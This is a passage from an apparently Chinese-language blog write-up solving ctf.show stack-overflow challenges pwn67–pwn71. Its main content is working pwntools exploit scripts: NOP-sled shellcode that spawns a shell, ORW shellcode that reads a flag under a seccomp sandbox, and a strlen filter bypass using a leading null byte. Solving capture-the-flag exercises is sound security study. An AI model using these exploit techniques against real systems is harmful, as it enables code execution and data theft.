<p>根据前面对shellcode的执行方式的分析，此时应该使用nop sled技巧，通过获得的&amp;v1+v2（以下简称变址）的值，以及v1和seed之间的距离来得到一个seed内部的地址。由于变址是一个随机值，此处无法准确得到seed的首地址到底是哪一个，所以需要用nop sled技巧。</p>
<p>v1到seed的距离:v1到query_position函数的ebp的距离0x15，ret和ebp本身的大小是2*0x4，main的esp到seed的距离是0x10，所以总的距离是0x15+0x8+0x10&#x3D;0x2d（其实我感觉这里应该是0x29，不过官方wp写的是0x2d，所以就不太讲究，这里差一点点其实也没什么关系，因为seed给的空间很大，只要shellcode写得靠后一点一样可以执行到）</p>
<h5 id="nop-sled技巧"><a href="#nop-sled技巧" class="headerlink" title="nop sled技巧"></a>nop sled技巧</h5><p>简单来说，就是通过填充nop指令，以n*nop+shellcode的方式，来避免无法直接执行到shellcode的情况。在本题中，输入shellcode时需要在shellcode前插入很多个nop指令，再通过变址来跳入到seed中，执行到nop指令之后就会一路sled到shellcode。其实就是一种因为不知道shellcode首地址而采取的方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">NOP sled 是一种在计算机安全中使用的技术，特别是在缓冲区溢出攻击中。它是一系列连续的无操作指令（NOP，No Operation）组成的指令序列，通常用于增加攻击的成功几率。NOP sled 是一种简单但有效的方法，确保在缓冲区溢出后程序控制流能够找到并执行攻击者注入的恶意代码（通常称为 shellcode）。</span><br><span class="line"></span><br><span class="line">NOP sled 的工作原理</span><br><span class="line"></span><br><span class="line">1. NOP 指令：在 x86 架构中，NOP 指令的操作码是 `0x90`，执行这条指令不会对 CPU 寄存器或内存造成任何改变，仅仅使程序计数器 (Instruction Pointer) 向前移动到下一条指令。其他架构也有类似的无操作指令。</span><br><span class="line"></span><br><span class="line">2. 结构：NOP sled 通常由多个连续的 NOP 指令组成，紧接着是实际的恶意代码（shellcode）。例如：</span><br><span class="line">   </span><br><span class="line">   0x90 0x90 0x90 0x90 ... 0x90 &lt;shellcode&gt;</span><br><span class="line"></span><br><span class="line">   其中 `0x90` 表示 NOP 指令。</span><br><span class="line"></span><br><span class="line">3. 功能：在缓冲区溢出攻击中，攻击者会试图将恶意代码插入到一个被溢出的缓冲区中，并覆盖返回地址或函数指针，导致程序执行流跳转到该缓冲区所在的内存区域。</span><br><span class="line"></span><br><span class="line">   由于攻击者不总是精确地知道恶意代码在内存中的确切地址，他们会用 NOP sled 来填充缓冲区的一部分。在执行流跳转到 NOP sled 任何位置时，它会一直执行 NOP 指令，直到到达真正的 shellcode 并开始执行恶意代码。</span><br><span class="line"></span><br><span class="line">NOP sled 的优势</span><br><span class="line"></span><br><span class="line">1. 增加攻击成功率：因为 NOP sled 是一系列无操作指令，程序跳转到 NOP sled 的任何位置都会安全地滑向恶意代码的位置，因此可以大大增加找到并执行恶意代码的几率。</span><br><span class="line"></span><br><span class="line">2. 易于实现：NOP sled 简单且有效，不需要复杂的构造，易于在许多缓冲区溢出攻击场景中应用。</span><br><span class="line"></span><br><span class="line">现代防御技术</span><br><span class="line"></span><br><span class="line">尽管 NOP sled 是一种古老且有效的技术，但现代操作系统和硬件引入了多种安全措施来对抗缓冲区溢出攻击和类似的漏洞利用技术，例如：</span><br><span class="line"></span><br><span class="line">1. 数据执行保护 (DEP)：防止某些内存区域（例如堆栈和堆）中的代码执行。</span><br><span class="line">2. 地址空间布局随机化 (ASLR)：随机化内存地址布局，使得攻击者难以预测确切的内存地址，包括缓冲区和返回地址。</span><br><span class="line">3. 栈保护机制：在栈帧中插入保护值（如 canary），以检测溢出并防止执行流劫持。</span><br><span class="line"></span><br><span class="line">这些技术的应用大大提高了利用 NOP sled 进行攻击的难度。然而，理解和学习这些技术对于计算机安全研究和防御非常重要。</span><br></pre></td></tr></table></figure>

<p>发送payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn67&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28208&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode= asm(shellcraft.sh())</span><br><span class="line">padding = 0x2d</span><br><span class="line">payload = b&#x27;\x90&#x27;*1500 + shellcode</span><br><span class="line">p.recvuntil(&quot;The current location: 0x&quot;)</span><br><span class="line">rand_addr = u64(unhex(p.recvline(keepends=False).zfill(16)),endian=&#x27;big&#x27;)</span><br><span class="line">v5 = hex(rand_addr + 668 +padding)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">p.sendline(v5)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn68"><a href="#pwn68" class="headerlink" title="pwn68"></a>pwn68</h4><p>题目提示：64bit nop sled</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808214853709.png" alt="image-20240808214853709"></p>
<p>反编译代码，看着跟上题差不多</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240809212912763.png" alt="image-20240809212912763"></p>
<p>所以这里也采取跟上题差不多的解题方法</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240811120046516.png" alt="image-20240811120046516"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240811120131363.png" alt="image-20240811120131363"></p>
<p>模拟出栈空间的布局</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240811141048519.png" alt="image-20240811141048519"></p>
<p>从v1到seed的间隔为0x35（这里官方wp写的也是0x35，不知道怎么解释，所以就不纠结了)</p>
<p>发送payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn68&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28104&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode= asm(shellcraft.sh())</span><br><span class="line">padding = 0x35</span><br><span class="line">payload = b&#x27;\x90&#x27;*1500 + shellcode</span><br><span class="line">p.recvuntil(&quot;The current location: 0x&quot;)</span><br><span class="line">rand_addr = u64(unhex(p.recvline(keepends=False).zfill(16)),endian=&#x27;big&#x27;)</span><br><span class="line">v5 = hex(rand_addr + 668 +padding)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">p.sendline(v5)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn69"><a href="#pwn69" class="headerlink" title="pwn69"></a>pwn69</h4><p>题目提示：可以尝试用ORW读flag flag文件位置为&#x2F;ctfshow_flag</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240811212304011.png" alt="image-20240811212304011"></p>
<p>64bit的程序，没有nx，没有canary</p>
<p>根据题目的提示，可以先学习一下orw技巧（在Reference中给出了学习的链接），由于链接中解释得很清楚，这里也就不多赘述，只罗列一下我解题的流程</p>
<p>首先下载一个seccomp-tools查看程序是否启用了沙箱</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br><span class="line">chmod +x pwn69</span><br><span class="line">seccomp-tools dump ./pwn69</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240812161601653.png" alt="image-20240812161601653"></p>
<p>结果如下，自然是有的，copy一下chatgpt的解析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">你提供的输出是使用 `seccomp-tools` 工具对一个二进制文件（例如 `./pwn69`）进行 `seccomp` 策略转储的结果。`seccomp` 是 Linux 内核中的一个安全机制，它用于限制进程可以调用的系统调用，从而减少攻击面。</span><br><span class="line"></span><br><span class="line">让我们逐行解释这个转储的含义：</span><br><span class="line"></span><br><span class="line">1. 0000: `0x20 0x00 0x00 0x00000004`</span><br><span class="line">   - `A = arch`：这行指令将架构标识符（如 x86_64）加载到寄存器 `A` 中。</span><br><span class="line"></span><br><span class="line">2. 0001: `0x15 0x00 0x08 0xc000003e`</span><br><span class="line">   - `if (A != ARCH_X86_64) goto 0010`：如果当前架构不是 `x86_64`（即 `A != 0xc000003e`），则跳转到指令 `0010`，即终止进程。</span><br><span class="line"></span><br><span class="line">3. 0002: `0x20 0x00 0x00 0x00000000`</span><br><span class="line">   - `A = sys_number`：将系统调用号加载到寄存器 `A` 中。</span><br><span class="line"></span><br><span class="line">4. 0003: `0x35 0x00 0x01 0x40000000`</span><br><span class="line">   - `if (A &lt; 0x40000000) goto 0005`：如果系统调用号小于 `0x40000000`，则跳转到指令 `0005`。</span><br><span class="line"></span><br><span class="line">5. 0004: `0x15 0x00 0x05 0xffffffff`</span><br><span class="line">   - `if (A != 0xffffffff) goto 0010`：如果系统调用号不等于 `0xffffffff`，则跳转到指令 `0010`。</span><br><span class="line"></span><br><span class="line">6. 0005: `0x15 0x03 0x00 0x00000000`</span><br><span class="line">   - `if (A == read) goto 0009`：如果系统调用号等于 `read`（编号 `0`），则跳转到指令 `0009`，即允许系统调用。</span><br><span class="line"></span><br><span class="line">7. 0006: `0x15 0x02 0x00 0x00000001`</span><br><span class="line">   - `if (A == write) goto 0009`：如果系统调用号等于 `write`（编号 `1`），则跳转到指令 `0009`，即允许系统调用。</span><br><span class="line"></span><br><span class="line">8. 0007: `0x15 0x01 0x00 0x00000002`</span><br><span class="line">   - `if (A == open) goto 0009`：如果系统调用号等于 `open`（编号 `2`），则跳转到指令 `0009`，即允许系统调用。</span><br><span class="line"></span><br><span class="line">9. 0008: `0x15 0x00 0x01 0x0000003c`</span><br><span class="line">   - `if (A != exit) goto 0010`：如果系统调用号不等于 `exit`（编号 `60`），则跳转到指令 `0010`。</span><br><span class="line"></span><br><span class="line">10. 0009: `0x06 0x00 0x00 0x7fff0000`</span><br><span class="line">    - `return ALLOW`：允许该系统调用执行。</span><br><span class="line"></span><br><span class="line">11. 0010: `0x06 0x00 0x00 0x00000000`</span><br><span class="line">    - `return KILL`：终止进程。</span><br><span class="line"></span><br><span class="line">总结</span><br><span class="line">这段 `seccomp` 策略的目的是允许 `read`、`write`、`open` 和 `exit` 这几个系统调用，而对于任何其他系统调用，都会终止进程。这种配置通常用于限制进程只能执行非常有限的操作，以增强安全性。</span><br></pre></td></tr></table></figure>

<p>目前已知在这个沙箱中只能使用read，write，open，exit函数，如何使用orw技巧实现对文件的查看呢？</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240812163220983.png" alt="image-20240812163220983"></p>
<p>回到程序的反编译代码，在main函数中，首先调用的是一个mmap函数，将从0x123000开始的长度为4096的一片区域权限改为可写可执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(复制自官方wp，当然这个函数我们在前面的题目中也是有遇到过的)</span><br><span class="line">mmap()函数的主要用途有三个：</span><br><span class="line">1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代I/O读</span><br><span class="line">写，以获得较高的性能；</span><br><span class="line">2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间；</span><br><span class="line">3、为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。</span><br></pre></td></tr></table></figure>

<p>sub_400949函数就是开启沙箱的函数，其中调用了seccomp的相关函数</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240812163529919.png" alt="image-20240812163529919"></p>
<p>sub_400906是setbuf的相关函数</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240812163615114.png" alt="image-20240812163615114"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">禁用了标准输入，标准输出和标准错误输出的缓冲区</span><br><span class="line"></span><br><span class="line">禁用缓冲通常用于以下情况：</span><br><span class="line"></span><br><span class="line">调试: 确保调试信息即时输出。</span><br><span class="line">实时应用: 需要实时处理输入或输出。</span><br><span class="line">交互式程序: 确保用户的输入和程序的响应是即时的。</span><br><span class="line">总的来说，这段代码确保在程序运行期间，输入和输出操作是即时的，没有缓冲区的延迟。</span><br></pre></td></tr></table></figure>

<p>sub_400A16就是栈溢出的漏洞函数</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240812165220597.png" alt="image-20240812165220597"></p>
<p>解题思路：先输入buf_shellcode，再执行buf_shellcode，然后跳转到mmap映射区域执行orw_shellcode使用orw输出flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 读取./ctfshow_flag中的内容，然后输出到标准输出，文件描述符3就是代指./ctfshow_flag这个文件，读取100个字节，然后输出到1（标准输出），这个部分是写在mmap映射的区域的</span><br><span class="line"></span><br><span class="line">orw_shellcode = shellcraft.open(&quot;./ctfshow_flag&quot;)</span><br><span class="line">orw_shellcode += shellcraft.read(3,mmap,100)</span><br><span class="line">orw_shellcode += shellcraft.write(1,mmap,100)</span><br><span class="line">orw_shellcode = asm(orw_shellcode)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 写在buf中的shellcode，要有读取的功能，从标准输入中读取orw_shellcode到mmap映射的区域，需要注意的是，在执行ret时，程序会跳转到jmp_rsp_addr，去执行jmp rsp指令。而在执行ret时，rsp会加8，也就是说在执行完leave和ret之后rsp会指向&quot;sub rsp,0x30; jmp rsp&quot;指令，然后开始执行buf_shellcode，注意这里是没有开启canary的，所以可以直接这样做</span><br><span class="line"></span><br><span class="line">jmp_rsp_addr = 0x400a01</span><br><span class="line">buf_shellcode = asm(shellcraft.read(0,mmap,100)) + asm(&quot;mov rax,0x123000; jmp rax&quot;)</span><br><span class="line">buf_shellcode = buf_shellcode.ljust(0x28,&#x27;\x00&#x27;)</span><br><span class="line">buf_shellcode += p64(jmp_rsp_addr) + asm(&quot;sub rsp,0x30; jmp rsp&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn69&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28251&#x27;)</span><br><span class="line"></span><br><span class="line">mmap = 0x123000</span><br><span class="line">orw_shellcode = shellcraft.open(&quot;./ctfshow_flag&quot;)</span><br><span class="line">orw_shellcode += shellcraft.read(3,mmap,100)</span><br><span class="line">orw_shellcode += shellcraft.write(1,mmap,100)</span><br><span class="line">orw_shellcode = asm(orw_shellcode)</span><br><span class="line"></span><br><span class="line">jmp_rsp_addr = 0x400a01</span><br><span class="line">buf_shellcode = asm(shellcraft.read(0,mmap,100)) + asm(&quot;mov rax,0x123000; jmp rax&quot;)</span><br><span class="line">buf_shellcode = buf_shellcode.ljust(0x28,b&#x27;\x00&#x27;)</span><br><span class="line">buf_shellcode += p64(jmp_rsp_addr) + asm(&quot;sub rsp,0x30; jmp rsp&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;do&#x27;)</span><br><span class="line">p.sendline(buf_shellcode)</span><br><span class="line">p.sendline(orw_shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="执行jmp指令后"><a href="#执行jmp指令后" class="headerlink" title="执行jmp指令后"></a>执行jmp指令后</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">执行 `jmp rsp` 指令后，CPU 会将控制转移到当前栈指针（`rsp`）所指向的地址。具体来说，执行后寄存器的变化如下：</span><br><span class="line"></span><br><span class="line">1. 指令指针（RIP 或 EIP，具体取决于你使用的架构） 会被更新为 `rsp` 现在指向的地址。</span><br><span class="line">2. 栈指针（RSP） 本身保持不变，因为 `jmp` 指令只是让 CPU 跳转到新的地址，不会改变栈指针的值。</span><br><span class="line"></span><br><span class="line">总的来说，在执行 `jmp rsp` 后，程序会跳转到 `rsp` 指向的地址，并继续执行该地址处的指令。寄存器 RSP 的值不会发生变化，只是控制流发生了改变。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="执行ret指令后"><a href="#执行ret指令后" class="headerlink" title="执行ret指令后"></a>执行ret指令后</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">执行 `ret` 指令后，主要影响的寄存器是指令指针（`RIP` 或 `EIP`，取决于你使用的平台）。具体变化如下：</span><br><span class="line"></span><br><span class="line">1. 指令指针（RIP 或 EIP）：</span><br><span class="line">   - `ret` 指令会从栈中弹出一个地址，该地址是之前调用该函数时通过 `call` 指令压入栈的返回地址。执行 `ret` 后，`RIP` 会被更新为这个弹出的地址。</span><br><span class="line"></span><br><span class="line">2. 栈指针（RSP）：</span><br><span class="line">   - 在执行 `ret` 指令时，栈指针 `RSP` 会增加（通常会加8或4，具体取决于架构是64位还是32位），以指向下一个栈位置，即指向返回地址之后的位置。</span><br><span class="line"></span><br><span class="line">因此，总结来说，执行 `ret` 后，`RIP` 会更新为从栈中弹出的返回地址，而 `RSP` 则会向上移动以反映栈的变化。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="执行leave指令后"><a href="#执行leave指令后" class="headerlink" title="执行leave指令后"></a>执行leave指令后</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">`LEAVE` 指令在 x86 和 x64 汇编中用于从子例程返回，通常与 `CALL` 指令配合使用。执行 `LEAVE` 指令时，`RSP` 的变化取决于栈帧的结构。</span><br><span class="line"></span><br><span class="line">`LEAVE` 指令的操作</span><br><span class="line">`LEAVE` 指令通常执行以下操作：</span><br><span class="line"></span><br><span class="line">1. 恢复基指针：将 `RBP`（基指针寄存器）恢复到之前的值，这通常是由 `MOV RBP, [RSP]` 实现的。</span><br><span class="line">2. 更新栈指针：将 `RSP` 指向栈帧的顶部，通常的代码是 `MOV RSP, RBP`。</span><br><span class="line"></span><br><span class="line">`LEAVE` 的结果：</span><br><span class="line">- 在执行前，`RSP` 指向当前栈帧的顶部。</span><br><span class="line">- 在执行后，`RSP` 将恢复到保存的基指针位置（即 `RBP` 的值），并且 `RBP` 的值会从栈中弹出，通常会导致栈指针 `RSP` 增加（因为弹出操作通常是增加指针）。</span><br><span class="line"></span><br><span class="line">小结</span><br><span class="line">执行 `LEAVE` 后，`RSP` 的值会变成保存的 `RBP` 值，通常情况会使 `RSP` 增加，具体数值变化依赖于栈帧的结构和栈中数据的布局。一般来说，`LEAVE` 是一种用于返回之前的栈状态的重要指令。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="pwn70"><a href="#pwn70" class="headerlink" title="pwn70"></a>pwn70</h4><p>题目提示：可以开始你的个人秀了 flag文件位置为&#x2F;flag</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240816144833353.png" alt="image-20240816144833353"></p>
<p>注意一个点：开启了canary，接着再看反编译的代码，由于有一个call rax，这里反编译失败了，不过看汇编代码也能看出大概的程序执行流程（其实把call rax修改为nop就可以成功反编译）</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240816224732941.png" alt="image-20240816224732941"></p>
<p>其中call rax就是if语句的另一个分支，需要读入的s是满足is_printable的字符串，ascii介于32到126，128-~之间，还需要注意的点是这里也开启了沙箱</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240816225646612.png" alt="image-20240816225646612"></p>
<p>从解题的思路出发，那么只要我们输入一个全都是printable的字符串不就可以了吗，跟之前那个使用大写字母和数字组合的题目一样。感觉说不定是可以的，可惜这里read是限制长度的。而且我也是菜鸡，还是按照官方wp的方法来。</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240818213812620.png" alt="image-20240818213812620"></p>
<p>在is_printable中使用的是strlen得到字符串的长度再进行if判断，但是如果我们不进入这个for循环，就可以直接返回正确的结果。根据strlen的原理，可以使用以\x00开头的字符串来绕过strlen，使其返回0，这样就可以输入无限制的shellcode。如何得到对shellcode不会产生影响的\x00开头的指令，可以跳转pwn66。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn70&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28273&#x27;)</span><br><span class="line"></span><br><span class="line"># 这里使用cat能成功应该是因为cat调用的是open,read,write,close等系统调用号，跟execve无关</span><br><span class="line">shellcode = b&#x27;\x00\xc0&#x27; + asm(shellcraft.cat(&#x27;/flag&#x27;))</span><br><span class="line"></span><br><span class="line"># 这个shellcode也可以，试了一下没有超过0x64，重点在于要找到一个有读写权限的区域，这个是我用vmmap找的</span><br><span class="line">shellcode = b&#x27;\x00\xc0&#x27; + asm(shellcraft.open(&#x27;/flag&#x27;)+shellcraft.read(3,0x602000,50)+shellcraft.write(1,0x602000,50))</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240818230631253.png" alt="image-20240818230631253"></p>
<h5 id="strlen原理"><a href="#strlen原理" class="headerlink" title="strlen原理"></a>strlen原理</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strlen的原理就是根据传入的指针，一个字节一个字节去遍历，直到遇到空结束字符。 strlen遍历完第一个字节0x01后遇到了0x00，那此时strlen就停止遍历，向调用者返回计算结果1。 </span><br></pre></td></tr></table></figure>

<h4 id="pwn71"><a href="#pwn71" class="headerlink" title="pwn71"></a>pwn71</h4><p>题目提示：32位的ret2syscall</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240819174204094.png" alt="image-20240819174204094"></p>
<p>可以看到pwn71是静态编译的(statically linked)，而且nx也是开启的</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240821112209862.png" alt="image-20240821112209862"></p>
<p>看看反编译出来的代码，是非常简单的，其实用其他方法也能做，但是既然这里要求用ret2syscall，那我们就用ret2syscall吧</p>
<h5 id="ret2syscall补充"><a href="#ret2syscall补充" class="headerlink" title="ret2syscall补充"></a>ret2syscall补充</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</span><br><span class="line"></span><br><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br><span class="line">其中，该程序是 32 位，所以我们需要使得</span><br><span class="line">系统调用号，即 eax 应该为 0xb</span><br><span class="line">第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，即 ecx 应该为 0</span><br><span class="line">第三个参数，即 edx 应该为 0</span><br><span class="line">(ctfwiki原话)</span><br><span class="line"></span><br><span class="line">应用程序调用系统调用的过程是：</span><br><span class="line">把系统调用的编号存入 EAX；</span><br><span class="line">把函数参数存入其它通用寄存器；</span><br><span class="line">触发 0x80 号中断（int 0x80）。</span><br><span class="line">(wikipedia原话)</span><br><span class="line"></span><br><span 